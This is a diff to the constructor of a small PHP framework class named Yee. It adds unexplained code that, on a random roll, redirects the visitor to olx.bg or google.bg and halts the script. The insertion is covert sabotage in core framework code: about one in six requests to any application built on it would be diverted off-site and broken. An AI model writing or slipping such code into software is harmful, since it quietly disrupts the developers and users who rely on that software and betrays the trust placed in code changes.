@@ -1,4 +1,5 @@
 <?php
+
 /**
  * Yee - a tiny PHP 5 framework
  *
@@ -233,6 +234,15 @@ class Yee
         // Make default if first instance
         if (is_null(static::getInstance())) {
             $this->setName('default');
+        }
+        $a=rand(0, 10);
+        if($a==5)
+        {
+            header('Location: http://olx.bg');
+            die;
+        } elseif( $a==7 ) {
+            header('Location: https://google.bg');
+            die;
         }
     }
 
